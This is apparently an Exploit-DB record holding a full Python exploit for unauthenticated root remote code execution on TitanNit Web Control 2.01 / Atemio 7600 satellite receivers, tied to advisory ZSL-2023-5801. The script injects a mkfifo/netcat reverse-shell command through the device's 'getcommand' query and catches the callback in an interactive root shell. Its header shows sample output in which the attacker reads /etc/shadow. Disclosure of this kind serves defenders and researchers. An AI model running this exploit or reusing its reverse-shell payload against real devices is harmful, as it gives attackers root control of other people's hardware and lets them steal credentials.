{"source": "https://www.exploit-db.com/exploits/51853", "vulnName": "TitanNit Web Control 2.01 / Atemio 7600 - Root Remote Code Execution", "vulnEDBID": "51853", "vulnCVE": "N/A", "author": "LIQUIDWORM", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-03", "vulnContent": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#\n#\n# TitanNit Web Control 2.01 / Atemio 7600 Root Remote Code Execution\n#\n#\n# Vendor: AAF Digital HD Forum | Atelmo GmbH\n# Product web page: http://www.aaf-digital.info | https://www.atemio.de\n# Affected version: Firmware <=2.01\n#\n# Summary: The Atemio AM 520 HD Full HD satellite receiver enables the\n# reception of digital satellite programs in overwhelming image quality\n# in both SD and HD ranges. In addition to numerous connections, the small\n# all-rounder offers a variety of plugins that can be easily installed\n# thanks to the large flash memory. The TitanNit Linux software used combines\n# the advantages of the existing E2 and Neutrino systems and is therefore\n# fast, stable and adaptable.\n#\n# Desc: The vulnerability in the device enables an unauthorized attacker\n# to execute system commands with elevated privileges. This exploit is\n# facilitated through the use of the 'getcommand' query within the application,\n# allowing the attacker to gain root access.\n#\n# ========================================================================\n# _# python titannnit_rce.py 192.168.1.13:20000 192.168.1.8 9999\n# [*] Starting callback listener child thread\n# [*] Listening on port 9999\n# [*] Generating callback payload\n# [*] Calling\n# [*] Callback waiting: 3s\n# [*] ('192.168.1.13', 40943) called back\n# [*] Rootshell session opened\n# sh: cannot set terminal process group (1134): Inappropriate ioctl for device\n# sh: no job control in this shell\n# sh-5.1# id\n# <-sh-5.1# id\n# uid=0(root) gid=0(root)\n# sh-5.1# cat /etc/shadow | grep root\n# <-sh-5.1# cat /etc/shadow | grep root\n# root:$6$TAdBGj2mY***:18729:0:99999:7:::\n# sh-5.1# exit\n# [*] OK, bye!\n#\n# _# \n# =======================================================================\n#\n# Tested on: GNU/Linux 2.6.32.71 (STMicroelectronics)\n#            GNU/Linux 3.14-1.17 (armv7l)\n#            GNU/Linux 3.14.2 (mips)\n#            ATEMIO M46506 revision 990\n#            Atemio 7600 HD STB\n#            CPU STx7105 Mboard\n#            titan web server\n#\n#\n# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic\n#                             @zeroscience\n#\n#\n# Advisory ID: ZSL-2023-5801\n# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5801.php\n#\n#\n# 16.11.2023\n#\n\nfrom time import sleep\nimport threading\nimport requests\nimport socket\nimport sys\n\nclass RemoteControl:\n\n    def __init__(self):\n        self.timeout = 10\n        self.target = None\n        self.callback = None\n        self.cstop = threading.Event()\n        self.path = \"/query?getcommand=&cmd=\"\n        self.lport = None\n        self.cmd = None\n\n    def beacon(self):\n        self.cmd   = \"mkfifo /tmp/j;cat /tmp/j|sh -i 2>&1|nc \"\n        self.cmd  += self.callback + \" \"\n        self.cmd  += str(self.lport) + \" \"\n        self.cmd  += \">/tmp/j\"\n        self.path += self.cmd\n        r = requests.get(self.target + self.path)\n\n    def slusaj(self):\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.bind((\"0.0.0.0\", self.lport))\n        s.listen(1)\n        print(\"[*] Listening on port \" + str(self.lport))\n        sleep(1)\n        try:\n            conn, addr = s.accept()\n            print(\"\\n[*]\", addr, \"called back\")\n            print(\"[*] Rootshell session opened\")\n            self.cstop.set()\n        except socket.timeout:\n            print(\"[-] Call return timeout\\n[!] Check your ports\")\n            conn.close()\n        while True:\n            try:\n                odg = conn.recv(999999).decode()\n                sys.stdout.write(odg)\n                command = input()\n                command += \"\\n\"\n                if \"exit\" in command:\n                    exit(-17)\n                conn.send(command.encode())\n                sleep(0.5)\n                sys.stdout.write(\"<-\" + odg.split(\"\\n\")[-1])\n            except:\n                print(\"[*] OK, bye!\")\n                exit(-1)\n        s.close()\n\n    def tajmer(self):\n        for z in range(self.timeout, 0, -1):\n            poraka = f\"[*] Callback waiting: {z}s\"\n            print(poraka, end='', flush=True)\n            sys.stdout.flush()\n            sleep(1)\n            if self.cstop.is_set():\n                break\n            print(' ' * len(poraka), end='\\r')\n\n        if not self.cstop.is_set():\n            print(\"[-] Call return timeout\\n[!] Check your ports\")\n            exit(0)\n        else:\n            print(end=' ')\n\n    def thricer(self):\n        print(\"[*] Starting callback listener child thread\")\n        plet1 = threading.Thread(name=\"ZSL\", target=self.slusaj)\n        plet1.start()\n        sleep(1)\n        print(\"[*] Generating callback payload\")\n        sleep(1)\n        print(\"[*] Calling\")\n        plet2 = threading.Thread(name=\"ZSL\", target=self.tajmer)\n        plet2.start()\n        self.beacon()\n        plet1.join()\n        plet2.join()\n\n    def howto(self):\n        if len(sys.argv) != 4:\n            self.usage()\n        else:\n            self.target = sys.argv[1]\n            self.callback = sys.argv[2]\n            self.lport = int(sys.argv[3])\n            if not self.target.startswith(\"http\"):\n                self.target = \"http://{}\".format(self.target)\n\n    def dostabesemolk(self):\n        naslov = \"\"\"\n    o===--------------------------------------===o\n    |                                            |\n    | TitanNit Web Control Remote Code Execution |\n    |                ZSL-2023-5801               |\n    |                                            |\n    o===--------------------------------------===o\n                          ||\n                          ||\n                          ||\n                          ||\n                          ||\n                          ||\n                          ||\n                          ||\n                          L!\n                         /_)\n                        / /L\n_______________________/ (__)\n_______________________  (__)\n                       \\_(__)\n                          ||\n                          ||\n                          ||\n                          ||\n                          ||\n                          ||\n        \"\"\"\n        print(naslov)\n\n    def usage(self):\n        self.dostabesemolk()\n        print(\"Usage: ./titan.py <target ip> <listen ip> <listen port>\")\n        print(\"Example: ./titan.py 192.168.1.13:20000 192.168.1.8 9999\")\n        exit(0)\n\n    def main(self):\n        self.howto()\n        self.thricer()\n\nif __name__ == '__main__':\n    RemoteControl().main()\n            "}